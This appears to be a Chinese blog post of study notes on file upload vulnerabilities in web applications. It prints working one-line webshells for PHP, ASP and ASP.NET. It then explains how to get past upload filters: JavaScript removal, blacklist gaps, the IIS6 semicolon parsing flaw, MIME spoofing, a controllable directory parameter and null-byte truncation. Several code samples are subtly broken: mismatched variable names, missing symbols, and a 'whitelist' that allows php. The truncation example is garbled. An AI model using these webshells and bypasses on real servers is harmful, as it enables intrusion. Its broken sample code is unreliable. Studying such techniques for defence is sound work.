不深入而浅出的文件上传漏洞——持续更新

web 学习笔记
攻防
发布日期:   2021-10-08

¶什么叫WebShell

WebShell，简称网页后门，简单说就是运行在web上的远程控制程序

webShell其实就是一张网页，由PHP、JSP、ASP、ASP.NET等这类web应用程序语言开发，但webShell并不具备常见网页的功能，例如登录、注册、信息展示等功能，一般会具备文件管理、端口扫描、提权、获取系统信息等功能。

常见的WebShell

大马、小马、各种马…等

拥有较完整功能的webshell，我们一般称为大马。

功能简易的webshell称为小马。

除此之外还存在一句话木马、菜刀马、脱库马等等的名词，是对于webShell功能或者特性的简称

¶WebShell之PHP一句话木马解读

<?php @eval($_POST[x]);?>

$_POST[x]: 获取 POST请求参数中X的值。例如POST请求中传x=phpinfo();，那么 $_POST[x]就等同于phpinfo();
eval（）将字符串当做PHP代码去执行。例如 eval(‘phpinfo();’)，其中 phpinfo();会被当做PHP代码去执行。
所以实际上的传递过程是这样的

<?php @eval(phpinfo());?>

¶常用的一句话木马

ASP：

<%eval request("x")%>

ASP.NET:

<%@ Page Language="Jscript"%><%eval (Request.Item["x"],"unsafe");%>

本质都一样，就是上传一个能输入代码的后端代码

¶文件上传漏洞概述

指用户上床了一个可执行的脚本文件，并通过此文件获取了执行服务器端命令的能力。一般出现在文件上传功能下，如头像更改，附录上传，文章编辑等等

¶文件上传功能的底层逻辑

  1. 文件上传功能的作用是将本地文件上传至服务器上进行保存
  2. 如果出现上传路径，我们可以通过该路径进行访问，那么我们就能在服务器上操作这个文件了

¶关于绕过检测

¶关于JAVASCRIPT（客户端）检测

程序员只在网页的前端上配置过滤（JAVASCRIPT)，所以只要绕过前端代码的过滤就行

  1. 使用Javascript Switcher插件去关闭JavaScript响应（即删除客户端的js认证）
  2. 使用BS，例如前端JS代码需要提交的是jpg文件，那么我们可以先将文件后缀改为jpg，绕过前端过滤后，再通过BS将文件改回php，注意的是，可能HTTP头部中存在Content-Length字段，可能需要修改。

¶关于服务器端验证

¶黑白名单验证

  1. 黑名单过滤

黑名单过滤，是定义了一系列不安全的扩展名，服务器端在接受文件后，与黑名单扩展名对比，如果发现文件拓展名与黑名单里的拓展名匹配，这认为上传文件不合法，则过滤。

<?php
$BlackList = array('asp','php','jsp','php5');//黑名单
if(isset($_POST["submit"])){
$name = $_FILES['file']['name'];//接受文件名
$extension = substr(strrchr($name, "."), 1);//得到拓展名
$boo = false;
foreach($BlackList as $key => $value){
if($value==$extension){//迭代判断是否命中
$boo = true;
break;}//命中后退出
}
if(!$boo){//如果没有被命中，则开始上传操作
$size = $_FILES['file']['size'];//接受文件大小
$tmp = $_FILES['file']['tmp_name'];//临时路径
move_uploaded_file($temp, $name);//移动临时文件到当前目录
echo "文件上传成功"
}
else{
echo "文件不合法"}
    }
?>

实际上可有很多方法能够绕开黑名单检测：

  1. 攻击者可以从黑名单中找到开发人员忽略的拓展，如asa
  2. 在过滤的php中并没有对大小写进行转化，这就意味着，我们可以通过大小写来绕过
  3. 在Windows环境下，如果文件名以"."或者空格作为结尾，系统会自动删去
  4. 对于PHP，.php .php3 4 5 .pht phtml都可以绕过

2.白名单过滤

白名单只定义允许上传的拓展名，白名单拥有比黑名单更好的防御机制

<?php
$WhiteList = array('asp','php','jsp','php5');//黑名单
if(isset($_POST["submit"])){
$name = $_FILES['file']['name'];//接受文件名
$extension = substr(strrchr($name, "."), 1);//得到拓展名
$boo = false;
foreach($WhiteList as $key => $value){
if($value==$extension){//迭代判断是否命中
$boo = true;
break;}//命中后退出
}
if($boo){//如果被命中，则开始上传操作
$size = $_FILES['file']['size'];//接受文件大小
$tmp = $_FILES['file']['tmp_name'];//临时路径
move_uploaded_file($temp, $name);//移动临时文件到当前目录
echo "文件上传成功"
}
else{
echo "文件不合法"}
    }
?>

但仍然存在风险，如web容器为IIS6.0，如果攻击者把木马文件名改为pentest.asp;a.jpg上传，此时的文件为jpg格式，此时可以绕过白名单，而IIS6.0会将pentest.asp;a.jpg文件当做ASP脚本执行，最终可以执行木马程序。白名单机制仅仅是防御上传漏洞的第一步

¶MIME验证

MIME类型用来设置某种拓展名文件的打开方式，当具有该拓展名的文件被访问时，浏览器会自动使用指定程序打开。如GIF图片的MIME为image/gif，CSS文件MIME类型为text/css。

上传时，开发人员经常会对文件MIME类型做验证

if($_FILES['file']['type']==" image/jpeg"){//判断是哦复试jpg格式
$imageTempName=$_FILES['file']['tmp_name'];
$imageName = $_FILES['file']['name'];
$last = substr($imageName, strrpos($imageName, "."));
if(!is_dir("uploadFile")){
mkdir("uploadFile");
}
$imageName = md5($imageName).$last;
move_uploaded_file(imageTempName, "./uploadFile/".$imageName);//指定上传文件到uploadFile目录
echo("文件上传成功")
}
else{
echo("失败")
}

上传php文件时，使用BS可以查看MIME类型，可以知道PHP文件的MIME类型为application/php，而在upload.php中会判断文件类型是否为image/jpeg，显然是无法通过的。所以我们可以将HTTP请求中的Content—Type更改为image/jpeg，这样就可以绕过了

¶目录验证

在文件上传时，程序通常允许用户将文件放到指定的目录中，然后有些开发人员通常会进行一个判断，如果指定的目录存在，就将文件写入目录中，不存在则先建立目录，然后写入

<form action="upload.php" method="post" enctype="multipart/form-data">
<input type="file" name = "file" /><br/>
<input type = "hidden" name="Extension" value="up"/>
<input type = "submit" value="提交" name="submit"/>
</form>
//PHP code:
if($_FILES['file']['type']=="image/jpeg"){//判断是否是jpg格式
$imageTempName=$_FILES['file']['tmp_name'];//接受文件路径
$imageName = $_FILES['file']['name'];//接受文件名称
$last = substr($imageName, strrpos($imageName, "."));//取得拓展名
if($last!=".jpg"){
exit("图片类型错误");}
$Extension = $_POST['Extension'];//获取文件上传目录
if(!is_dir($Extension)){//如果文件夹不存在，就建立
mkdir($Extension);
}
$imageName = md5($imageName).$last;
move_uploaded_file(imageTempName, "./$Extension/".$imageName);
echo("文件上传成功")
}
else{
echo("失败")
exit();
}
}

//在Upload.php中有以下代码
if(!is_dir($Extension)){//如果文件夹不存在，就建立文件夹
mkdir($Extension);
}

这段代码是引发漏洞的关键，HTML代码中有一个隐藏标签<input type = "hidden" name="Extension" value="up"/>，这是文件上传时的默认文件夹，而我们对此参数是可控的，比如：使用BS将value改为pentest.asp，并上传一句话图片木马，程序收到文件后，发现服务期不存在pentest.asp目录，则会创立此目录表，将一句话木马文件插入，如果web容器是IIS6.0，者会被执行

¶截断上传攻击

截断上传在ASP程序中最常见

<%
 username = request("username")
 Response.write username
 %>

这两句代码，用于接收username值并输出，如果在访问URL时: http://www.xxser.com/?username=xxseradmin，

则输出时只会显示xxser，可以发现在%000之后的字符串都被截断了，这就是截断上传的原理

所以在遇到有对.php过滤的时候，或是白名单中有没有.php时，可以尝试上传xxxser.php%00.jpg用来绕过asp
